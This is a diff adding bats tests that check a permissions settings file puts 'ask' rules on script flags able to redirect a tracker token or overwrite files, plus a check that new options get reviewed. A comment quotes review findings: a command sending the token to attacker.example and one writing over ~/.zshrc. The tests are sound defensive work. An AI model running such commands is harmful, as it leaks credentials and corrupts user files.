@@ -86,3 +86,61 @@ curl_commands() {
   fi
   [ -z "$bad" ] || { echo "curl rules that do not anchor on https://<host>/ :"; echo "$bad"; false; }
 }
+
+# ── flags that move a credential or write a file ────────────────────────────────────────────────────────────────
+# The allowlist approves whole families of commands with a trailing wildcard (`cli.js fetch *`). A flag inside that family can send the tracker's token
+# to a host of the caller's choosing (--base-url, or a --config that names one) or overwrite any file (--out, --context-file). Those flags are
+# never needed by the pipeline's own commands, so each is covered by an "ask" rule, which is checked before "allow": the command still works, but
+# the person sees it first. (A review found `cli.js fetch X --base-url https://attacker.example` and `normalize.js r --out ~/.zshrc` ran unprompted.)
+PROPOSED="$REPO_ROOT/docs/settings.proposed.json"
+REQUIRED_ASK=(
+  'tracker/cli.js*--base-url*' 'tracker/cli.js*--config*' 'tracker/post-tests.js*--base-url*' 'tracker/post-tests.js*--config*'
+  'results/normalize.js*--out*' 'tracker/cli.js*--context-file /*' 'tracker/cli.js*--context-file ~*' 'tracker/cli.js*--context-file*..*'
+)
+missing_ask() { # <settings file> -> prints every required fragment that no "ask" rule contains
+  local rules frag
+  rules=$(jq -r '(.permissions.ask // [])[]' "$1")
+  for frag in "${REQUIRED_ASK[@]}"; do grep -qF -- "$frag" <<<"$rules" || echo "$frag"; done
+}
+
+@test "the proposed settings ask before any allowed command redirects a token or writes elsewhere" {
+  run missing_ask "$PROPOSED"
+  [ -z "$output" ]
+}
+
+@test "the ACTIVE settings.json asks too (apply docs/settings.proposed.json if this fails)" {
+  run missing_ask "$SETTINGS"
+  [ -z "$output" ]
+}
+
+@test "lint: a settings file that lacks the --base-url rule is caught" {
+  jq '.permissions.ask |= map(select(contains("--base-url") | not))' "$PROPOSED" > "$BATS_TEST_TMPDIR/s.json"
+  run missing_ask "$BATS_TEST_TMPDIR/s.json"
+  [[ "$output" =~ "--base-url" ]]
+}
+
+@test "lint: a settings file that lacks the normalize --out rule is caught" {
+  jq '.permissions.ask |= map(select(contains("--out") | not))' "$PROPOSED" > "$BATS_TEST_TMPDIR/s.json"
+  run missing_ask "$BATS_TEST_TMPDIR/s.json"
+  [[ "$output" =~ "--out" ]]
+}
+
+@test "lint: a settings file with no ask rules at all is caught" {
+  jq 'del(.permissions.ask)' "$PROPOSED" > "$BATS_TEST_TMPDIR/s.json"
+  run missing_ask "$BATS_TEST_TMPDIR/s.json"
+  [ "$(echo "$output" | wc -l | tr -d ' ')" -eq "${#REQUIRED_ASK[@]}" ]
+}
+
+# A new option on one of these scripts could be another way to redirect a credential or write a file. This fails until someone has looked at it and
+# either added an ask rule above or listed it as harmless here.
+@test "the allowed scripts take only options that have been reviewed" {
+  check() { # <script> <known options...>
+    local script="$1"; shift
+    local found; found=$(grep -oE "flag === '--[a-z-]+'" "$REPO_ROOT/$script" | grep -oE -- '--[a-z-]+' | sort -u)
+    local opt
+    for opt in $found; do case " $* " in *" $opt "*) ;; *) echo "$script: unreviewed option $opt"; return 1 ;; esac; done
+  }
+  check scripts/tracker/cli.js --base-url --config --context-file --input --input-file --source --stdin --timeout-ms
+  check scripts/tracker/post-tests.js --base-url --cases --config --dry-run --keys-file --only --parent --source --timeout-ms
+  check scripts/results/normalize.js --format --framework --out
+}
